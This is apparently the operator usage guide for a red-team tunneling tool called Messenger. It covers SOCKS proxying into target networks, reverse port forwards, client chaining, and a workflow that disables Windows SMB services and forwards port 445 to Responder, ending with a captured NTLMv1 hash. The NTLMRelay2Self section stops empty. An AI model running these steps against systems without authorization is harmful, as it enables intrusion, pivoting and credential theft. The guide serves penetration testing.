# Operational Usage

One goal of Messenger is to make it easy for operators to perform specific attacks common to standard pentest and red team scenarios while also staying flexible enough to perform attacks we haven't thought about yet. Below you'll find the most common use-cases for Messenger and step-by-step instructions for how to perform these attacks.

### SOCKS Proxy

The most common use-case for Messenger is setting up an ingress SOCKS proxy, allowing network traffic from external tools to be tunneled into a target network.

1. After a new messenger checks in, interact with it by entering the messenger ID:
```
[+] WebSocket Messenger `PWnauryxxD` is now connected.
(messenger)~# PWnauryxxD
(PWnauryxxD)~#
```
2. Next, use the `socks` command with a specified port to open a SOCKS proxy.
```
(PWnauryxxD)~# socks 1080
[*] Attempting to forward (127.0.0.1:1080) -> (*:*).
[+] Messenger PWnauryxxD now forwarding (127.0.0.1:1080) -> (*:*).
(PWnauryxxD)~#
```
3. Use a proxy-capable tool, or a proxifier tool, such as `proxychains`, to send TCP traffic through the SOCKS proxy. An example `proxychains` config for a Messenger SOCKS proxy on port 1080 is provided here:
```
[ProxyList]
socks5  127.0.0.1 1080
```
4. Hint: to check to make sure your SOCKS tunnel is working, try using `curl` on `ifconfig.io` to check which IP address you are coming from.
```
# proxychains curl ifconfig.io
[proxychains] config file found: /etc/proxychains.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.14
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  ifconfig.io:80  ...  OK
68.12.211.24
```

### Reverse Port Forwards

Messenger supports reverse port forwards. A service hosted externally can be bridged in and hosted on the same computer as the Messenger client. Although reverse forwards do not require root/administrator access, firewall manipulation and binding to privileged ports typically do. A common example of this functionality is forwarding [Responder](https://github.com/lgandx/Responder)'s SMB capture server onto a compromised Windows host.
1. By default, TCP/445 is in use by the `System` process (PID: 4). In order to start a reverse forwarder on port 445, we first need to [unbind the server service](https://posts.specterops.io/relay-your-heart-away-an-opsec-conscious-approach-to-445-takeover-1c9b4666c8ac). This will require administrator privileges.
```powershell
Set-Service -ServiceName LanmanServer -StartupType Disabled
Stop-Service -ServiceName LanmanServer
Stop-Service -ServiceName srv2
Stop-Service -ServiceName srvnet
```
2. Verify the SMB service is no longer listening
```
netstat -ano | findstr 445
```
3. Next, start a Messenger client with a remote forward for TCP port 445. This will start a server bound to all interfaces (0.0.0.0) on TCP/445 on the Messenger client host. Traffic from this forwarder will be sent to 127.0.0.1:445 on the Messenger server after the forward is approved.
```
python3.exe messenger-client 192.168.1.100:8080 ZDXgoqyVXqDpJyBMJt 0.0.0.0:445:127.0.0.1:445
```
4. After the Messenger client connects, interact with the messenger and enable the remote forward from the server side. If not, the following message will appear in the Messenger server console:
```
[!] Messenger wtwNJsfYRJ has no Remote Port Forwarder configured for 127.0.0.1:445, denying forward!
```

```
[+] WebSocket Messenger `wtwNJsfYRJ` is now connected.
(messenger)~# wtwNJsfYRJ
(wtwNJsfYRJ)~# remote 445
[*] Messenger KacLHgjlol now forwarding (*:*) -> (127.0.0.1:445).
```
5. Start Responder and bind to the loopback interface on the Messenger server:
```
python3 Responder.py -I lo
```
6. Use a coercion technique or other method to force authentication back to the Messenger client host. As a simple proof of concept, open an Explorer window and enter `\\127.0.0.1\C$` in the folder path. If done correctly, Responder should have captured the forwarded authentication.
```
[SMB] NTLMv1-SSP Client   : 127.0.0.1
[SMB] NTLMv1-SSP Username : BORGAR\kclark
[SMB] NTLMv1-SSP Hash     : kclark::BORGAR:DA0D86D275019B9300000000000000000000000000000000:4E975DA5F409E4475F57BFCC28BBB3BF32F7FE6C29603B08:b26d7ecc63011faa
```

### Messenger Chaining

Messenger does not have a native method to chain multiple messenger clients to each other, but reverse port forwarding makes it possible to forward the messenger server through a client.
```
+-----------+        +-----------+        +-----------+
| Messenger |        | Messenger |        | Messenger |
| Server    | <----- | Client A  | <----- | Client B  |
|           |        |           |        |           |
+-----------+        +-----------+        +-----------+
```
1. Set up a reverse port forward on Messenger client A to forward the server's port. In this example, the Messenger server is listening on TCP/8080 and will be reverse forwarded to TCP/8888 on the Messenger client.
```
python3.exe messenger-client 192.168.1.100:8080 ZDXgoqyVXqDpJyBMJt 0.0.0.0:8888:127.0.0.1:8080
```
2. Start a second Messenger client (Messenger B) to link up with the now forwarded listener on the Messenger A host.
```
python3.exe messenger-client 192.168.1.20:8888 ZDXgoqyVXqDpJyBMJt
```
3. A new messenger should have checked in. This new Messenger can be interacted with like normal.
```
[+] WebSocket Messenger `SiHSttBrWG` is now connected.
(LDbNqWdgsk)~# messengers
                                  Messengers
   Identifier      Transport    Alive    Forwarders      Sent       Received
---------------- ------------- ------- -------------- ----------- ------------
  > LDbNqWdgsk     WebSocket     Yes     vHcsbeQnWM     4.57 KB     22.48 KB
   SiHSttBrWG      WebSocket     Yes        •••           0 B         0 B

(LDbNqWdgsk)~# forwarders
                                                   Forwarders
          Type              Identifier   Clients Listening Host Listening Port Destination Host Destination Port
------------------------- -------------- ------- -------------- -------------- ---------------- ----------------
  Remote Port Forwarder     vHcsbeQnWM      1          *              *           127.0.0.1           8080
```

### NTLMRelay2Self

[NTLMRelay2Self](https://github.com/med0x2e/NTLMRelay2Self) is a type of privilege escalation attack where an attacker performs authentication coercion and LDAP relay attacks in order to gain SYSTEM-level access to the compromised system. This attack requires the following:
- Low-privileged access on a domain-joined Windows workstation
- Ability to trigger-start the WebClient service on the workstation
- Ability to coerce authentication (via EFS, spooler, etc.) on the workstation
- LDAP signing or LDAPS channel binding not enforced on a DC
- Ability to perform computer-takeover primitive (RBCD or Shadow Credentials)

1. 

### Port Scanning

